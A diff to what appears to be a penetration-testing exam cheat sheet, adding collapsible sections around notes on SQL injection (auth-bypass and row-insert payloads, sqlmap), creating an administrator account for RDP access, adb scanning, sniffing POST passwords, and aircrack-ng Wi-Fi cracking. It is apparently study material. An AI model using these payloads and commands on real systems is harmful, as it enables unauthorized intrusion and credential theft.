@@ -68,7 +68,8 @@ Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wor
 		       | net user Test      (Once again check to see if it has become administrator)
 Now you can do a RDP connection with the given ip and the Test account which you created.
 ```
-#  SQL Injections
+<details>
+<summary>#  SQL Injections</summary>
 ```
 1- Auth Bypass-  hi'OR 1=1 --
 2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
@@ -82,6 +83,7 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
 ```
+</details>	
 # Android
 ```
 1- nmap ip -sV -p 5555    (Scan for adb port)
@@ -96,19 +98,24 @@ tcp.flags.syn == 1   (Which machine for dos)
 http.request.method == POST   (for passwords) or click tools ---> credentials
 Also
 ```
+<details>
 # Find FQDN
 ```
 nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
 ```
-# Cracking Wi-Fi networks
+</details>
+<details>
+<summary># Cracking Wi-Fi networks </summary>
 ```
 Cracking Wifi Password
 aircrack-ng [pcap file] (For cracking WEP network)
 aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)
-
+</details>
 ```
-#  Some extra work 
+<details> 
+<summary>#  Some extra work </summary>
 ```
 Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
 Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
 ```
+</details>
